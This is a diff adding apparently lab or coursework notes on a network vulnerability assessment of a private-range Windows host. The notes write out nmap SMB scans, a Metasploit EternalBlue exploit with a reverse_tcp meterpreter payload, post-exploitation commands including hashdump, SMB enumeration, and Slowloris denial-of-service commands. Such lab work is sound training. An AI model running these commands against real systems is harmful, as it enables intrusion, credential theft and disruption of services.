@@ -1,7 +1,6 @@
 # Part 1: Network Vulnerability assessmeent:
 ## Vulnerability scanning and enumeration
 
-
 ### Network discovery
 This is a critical phase where we shall define the methodology required to use tools for network discovering. 
 
@@ -125,4 +124,98 @@ for host in root.findall('host'):
 ![python-script](python-script.png)
 
 
+### Controled explotation
+
+```
+# 1. Verificación adicional de MS17-010
+nmap --script smb-vuln-ms17-010 -p 445 192.168.57.20 -oN ms17_verify.txt
+
+# 2. Enumeración SMB (sin explotar)
+nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.57.20
+
+# 3. Verificar si es realmente Windows 7
+nmap -sV --script smb-os-discovery 192.168.57.20 -p 445
+```
+
+Metaexploit:
+```
+msfconsole
+
+# Search exploit EternalBlue
+search ms17-010
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Set options
+set RHOSTS 192.168.57.20
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.57.10
+set LPORT 4444
+
+exploit
+```
+![metaexploit](metaexploit.png)
+
+
+
+Enumeration post-explotation:
+```
+# Meterpreter:
+sysinfo           # Información del sistema
+getuid            # Ver privilegios
+hashdump          # Extraer hashes de contraseñas
+ps                # Listar procesos
+screenshot        # Capturar pantalla
+```
+![meterpreter-sysinfo](meterpreter-sysinfo.png)
+
+![meterpreter-ps](meterpreter-ps.png)
+
+
+Additional vulnerabilites scanning
+```
+# 1. Escanear vulnerabilidades SMB adicionales
+nmap --script "smb-vuln-*" -p 445 192.168.57.20 -oN smb_all_vulns.txt
+
+# 2. Verificar NetBIOS vulnerabilidades
+nmap --script nbstat -sU -p 137 192.168.57.20
+
+# 3. Escanear RPC (puerto 135)
+nmap --script rpc-grind,msrpc-enum -p 135 192.168.57.20
+
+# 4. Verificar servicios UPnP (puertos 2869, 5357)
+nmap --script upnp-info -p 2869,5357 192.168.57.20
+```
+
+Basic forenstics from attack
+```
+# 1. Usar enum4linux para enumeración SMB completa
+enum4linux -a 192.168.57.20 > enum4linux_results.txt
+
+# 2. Probar conexión SMB anónima
+smbclient -L //192.168.57.20 -N
+
+# 3. Verificar si hay shares accesibles
+smbmap -H 192.168.57.20+
+```
+
+DoS tests
+```
+# 1. Probar Slowloris (con slowhttptest)
+slowhttptest -c 1000 -H -g -o slowloris_report -i 10 -r 200 -t GET -u http://192.168.57.20:5357 -x 24 -p 3
+
+# 2. Alternativa con Perl (si slowloris.pl está disponible)
+perl slowloris.pl -dns 192.168.57.20 -port 5357 -timeout 1
+```
+
+```
+
+```
+
+```
+
+```
+
+```
+
+```
 
